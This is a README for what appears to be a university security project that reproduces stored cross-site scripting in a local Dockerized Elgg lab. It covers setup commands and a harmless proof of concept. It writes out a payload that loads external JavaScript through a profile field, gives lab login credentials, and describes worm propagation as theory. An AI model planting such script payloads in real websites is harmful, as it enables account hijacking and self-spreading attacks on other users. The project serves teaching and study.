# Elgg Stored XSS & Self-Propagation — Safe Research Project

Academic Computer Security project (HUS, K68 KHMT) on **Stored Cross-Site
Scripting** via the Elgg **Brief Description** field, **external JavaScript
loading**, and **self-propagation** security analysis.

> **Safety scope.** Everything here runs in an **isolated local lab**
> (loopback / Docker `10.9.0.0/24`). We build the infrastructure and a
> **harmless** proof of concept, analyse the worm **theoretically**, and do
> **not** ship an autonomous, account-modifying worm. `exploit.py` is a
> *verification utility*, not a weapon. See
> [`docs/analysis/self-propagation-analysis.md`](docs/analysis/self-propagation-analysis.md).

## Team (from the official README.docx)

| Name | MSV | Role |
|---|---|---|
| Nguyễn Văn Thắng | 23001938 | Nhóm trưởng |
| Đinh Bá Thi | 23001942 | Thành viên |
| Đinh Quang Tiến | 23001943 | Thành viên |

## What's here

```
.
├── exploit.py                    # SAFE verification CLI (check/serve/validate-payload/test/report)
├── src/
│   ├── lab_config.py             # central config + lab target allow-list
│   ├── js_server/                # demo.js host server (health, JS MIME, 404, logs)
│   └── payload_validator/        # 250-char validator (code points vs UTF-8 bytes)
├── tests/                        # 44 pytest cases (validator, server, config, CLI)
├── elgg-lab/Labsetup/            # Dockerized Elgg 3.0 target (+ host-port override)
├── docs/
│   ├── requirements/             # requirements matrix (traceability)
│   ├── plans/                    # workspace audit + master plan + sub-plans
│   ├── analysis/                 # stored-XSS, HTTP workflows, self-propagation
│   ├── diagrams/                 # Mermaid: architecture, sequences, data-flow
│   ├── evidence/                 # real logs + pending-screenshot checklist
│   └── AI_USAGE_LOG.md           # AI disclosure (3 levels)
├── deliverables/                 # PPT + video script/shotlist/checklist + YouTube guide
├── BAO_CAO.md                    # final report (Vietnamese)
└── Resource/                     # ORIGINAL course materials (untouched)
```

## Quickstart

```bash
# 0. (optional) create a venv; only pytest is needed beyond the stdlib
python3 -m pip install pytest

# 1. Run the automated tests
python3 -m pytest tests/ -v

# 2. Start the external JavaScript host (serves the harmless demo.js)
python3 exploit.py serve            # http://127.0.0.1:8000/demo.js , /health

# 3. Validate a Brief Description payload against the 250-char limit
python3 exploit.py validate-payload '<script src="http://localhost:8000/demo.js"></script>'

# 4. Bring up the Elgg lab (Docker) — the vulnerable target
cd elgg-lab/Labsetup && docker compose up -d --build   # Elgg at http://localhost:8080
cd ../..

# 5. Check the whole lab and write a verification report
python3 exploit.py --check
python3 exploit.py --report --json   # -> docs/evidence/verification-report.md
```

## The experiment (harmless PoC)

1. Log into Elgg as `samy` (password `seedelgg`).
2. In **Brief Description**, store: `<script src="http://localhost:8000/demo.js"></script>`.
3. View Samy's profile → a green banner + one alert fire (the external script ran
   in Elgg's origin). Reload → it persists (stored XSS). Log in as `alice`, view
   Samy → the same banner (delivered to other users).
4. DevTools → Network shows the external `demo.js` GET with
   `Content-Type: application/javascript`.

`demo.js` changes **nothing** on any account. The worm's friend-add /
profile-edit / self-replication behaviour is explained as **theory** in the
analysis docs and is **not** implemented.

## Reproducibility notes

- Python 3.13, stdlib only at runtime; `pytest` for tests.
- Elgg 3.0 + MySQL 8.0.22 via Docker (`elgg-lab/`).
- No third-party runtime dependencies; no network calls outside the lab
  allow-list (loopback + `10.9.0.0/24`).

## Proposed local commit plan (nothing is pushed without permission)

1. `chore: workspace audit + requirements matrix`
2. `docs: master plan and sub-plans`
3. `feat(lab): dockerized Elgg 3.0 environment + README`
4. `feat(infra): demo.js host server + harmless payload`
5. `feat(validator): 250-char payload validator`
6. `docs(xss): stored-XSS analysis + harmless PoC`
7. `docs(http): sanitized HTTP/profile workflow analysis`
8. `feat(cli): safe exploit.py verification CLI`
9. `test: automated suite (44 cases) + saved output`
10. `docs(evidence): evidence index + pending checklist`
11. `docs(analysis): self-propagation analysis + diagrams`
12. `docs(deliverables): PowerPoint presentation`
13. `docs(deliverables): video materials + YouTube guide`
14. `docs: AI usage disclosure`
15. `docs: final report + QA`

## Documentation map

- Start: [`docs/plans/00-master-plan.md`](docs/plans/00-master-plan.md)
- Requirements: [`docs/requirements/requirements-matrix.md`](docs/requirements/requirements-matrix.md)
- Vulnerability: [`docs/analysis/stored-xss-analysis.md`](docs/analysis/stored-xss-analysis.md)
- Final report (VN): [`BAO_CAO.md`](BAO_CAO.md)
